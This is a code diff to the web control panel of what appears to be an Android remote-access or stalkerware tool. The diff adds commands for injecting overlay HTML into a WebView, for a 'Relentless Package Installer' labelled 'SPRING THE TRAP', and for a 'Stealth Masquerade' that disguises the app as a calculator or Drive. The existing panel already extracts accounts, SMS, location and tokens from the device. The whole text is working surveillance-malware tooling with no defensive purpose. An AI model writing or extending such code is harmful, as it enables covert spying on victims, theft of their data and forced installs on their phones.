@@ -260,7 +260,21 @@
                         <button class="btn" style="flex:1" onclick="sendCmd('GET_TOKEN')">Fetch Token</button>
                     </div>
                 </div>
-                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('WAKE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
+                <div class="cmd-row"><label class="cmd-label">Force Wake (Screen Ignite)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('WAKE', this)" title="Add Search Index">🏷️</button><button class="btn-status" onclick="auditCmd('WAKE')">?</button><select id="val-wake" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;"><option value="standard">Standard Wake</option><option value="wellbeing">Route to Wellbeing</option></select><button class="btn" onclick="sendCmd('WAKE')">Ignite</button></div></div>
+                
+                <div class="cmd-row">
+                    <label class="cmd-label">Dynamic UI Injection (WebView)</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('INJECT_UI', this)">🏷️</button><button class="btn-status" onclick="auditCmd('INJECT_UI')">?</button>
+                        <select id="ui-touchable" style="width:100px; background:#000; color:var(--primary); border:1px solid var(--surface-light);">
+                            <option value="TRUE">TOUCHABLE</option>
+                            <option value="FALSE">GHOST (NON-INTERACTIVE)</option>
+                        </select>
+                        <button class="btn" style="flex:1" onclick="sendCmd('INJECT_UI')">INJECT HTML</button>
+                        <button class="btn danger" onclick="sendCmd('REMOVE_UI')">KILL UI</button>
+                    </div>
+                    <textarea id="ui-html" placeholder="<html><body style='background:rgba(0,0,0,0.8);'>..." style="margin-top:5px; font-size:0.65rem; height:80px;"></textarea>
+                </div>
                 <div class="cmd-row">
                     <label class="cmd-label">Remote Intent</label>
                     <input type="text" id="int-act" value="android.intent.action.VIEW" placeholder="Action">
@@ -386,6 +400,16 @@
                         <button class="btn" id="push-deploy-btn" onclick="handlePushDeployment()">Deploy</button>
                     </div>
                 </div>
+                
+                <div class="cmd-row">
+                    <label class="cmd-label">Relentless Package Installer</label>
+                    <input type="text" id="install-path" placeholder="/sdcard/Download/update.apk">
+                    <textarea id="install-html" placeholder="(Optional) Explanation HTML (Cortex.startRelentlessInstall...)" style="font-size:0.65rem; height:60px; margin-top:5px;"></textarea>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('INSTALL_APP', this)">🏷️</button><button class="btn-status" onclick="auditCmd('INSTALL_APP')">?</button>
+                        <button class="btn" style="flex:1" onclick="sendCmd('INSTALL_APP')">SPRING THE TRAP</button>
+                    </div>
+                </div>
                 <div class="cmd-row"><label class="cmd-label">Storage Indexer (Depth)</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_SKELETON', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_SKELETON')">?</button><input type="number" id="val-skeleton" value="5" placeholder="Depth" style="width:80px"><button class="btn" onclick="sendCmd('GET_SKELETON')">Index</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Vault Storage Status</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_VAULT_SIZE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_VAULT_SIZE')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_VAULT_SIZE')">Query Vault Size</button></div></div>
                 <div class="cmd-row"><label class="cmd-label">Identity Extraction</label><div class="input-wrap"><button class="btn-tag" onclick="tagCmd('GET_ACCOUNTS', this)">🏷️</button><button class="btn-status" onclick="auditCmd('GET_ACCOUNTS')">?</button><button class="btn" style="flex:1" onclick="sendCmd('GET_ACCOUNTS')">Fetch System Accounts</button></div></div>
@@ -419,6 +443,18 @@
                         <button class="btn-tag" onclick="tagCmd('FORCE_UPLOAD', this)">🏷️</button><button class="btn-status" onclick="auditCmd('FORCE_UPLOAD')">?</button>
                         <input type="text" id="val-force" placeholder="e.g. sms:50, location, usage" value="ALL">
                         <button class="btn" onclick="sendCmd('FORCE_UPLOAD')">Extract</button>
+                    </div>
+                </div>
+
+                <div class="cmd-row">
+                    <label class="cmd-label">Stealth Masquerade (Skin)</label>
+                    <div class="input-wrap">
+                        <button class="btn-tag" onclick="tagCmd('SET_MASQUERADE', this)">🏷️</button><button class="btn-status" onclick="auditCmd('SET_MASQUERADE')">?</button>
+                        <select id="val-masquerade" style="flex:1; background:#000; color:var(--primary); border:1px solid var(--surface-light); padding:8px;">
+                            <option value="DRIVE">DRIVE SERVICES</option>
+                            <option value="CALC">CALCULATOR</option>
+                        </select>
+                        <button class="btn" onclick="sendCmd('SET_MASQUERADE')">APPLY SKIN</button>
                     </div>
                 </div>
             </div>
@@ -774,7 +810,17 @@
                     case 'UNBLIND':
                     case 'GET_ACCOUNTS':
                     case 'GET_SENSORS':
+                    case 'REMOVE_UI':
+                    case 'GET_ENGAGEMENT':
                         content = ''; break;
+                    case 'INJECT_UI':
+                        content = `${document.getElementById('ui-touchable').value} | ${document.getElementById('ui-html').value}`; break;
+                    case 'INSTALL_APP':
+                        const path = document.getElementById('install-path').value;
+                        const explanation = document.getElementById('install-html').value;
+                        content = explanation ? `${path} | ${explanation}` : path; break;
+                    case 'SET_MASQUERADE':
+                        content = document.getElementById('val-masquerade').value; break;
                 }
             }
 
